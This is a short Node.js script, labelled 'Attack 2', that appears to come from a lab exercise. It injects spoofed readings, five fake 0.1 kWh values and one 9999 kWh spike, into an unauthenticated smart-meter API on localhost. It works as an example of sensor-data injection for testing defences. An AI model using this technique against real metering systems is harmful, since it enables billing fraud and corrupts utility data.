/**
 * Attack 2: Sensor data spoofing / injection
 * Target: smart-meter device (V1 - no auth on /api/reading)
 * Simulates an attacker masking real consumption by injecting fake low readings.
 */
const axios = require("axios");

const BASE = process.env.METER_URL || "http://localhost:4002";

async function main() {
  console.log("== Injecting spoofed low-usage readings ==");
  for (let i = 0; i < 5; i++) {
    const fakeKwh = 0.1; // suspiciously low vs normal ~4kWh baseline
    const res = await axios.post(`${BASE}/api/reading`, { kwh: fakeKwh });
    console.log(`Injected reading #${i + 1}:`, res.data.reading);
    await new Promise(r => setTimeout(r, 300));
  }

  console.log("\n== Injecting an implausible spike (out-of-range) ==");
  const spike = await axios.post(`${BASE}/api/reading`, { kwh: 9999 });
  console.log("Spike reading result:", spike.data);
}

main().catch(e => console.error("Attack failed:", e.response?.data || e.message));
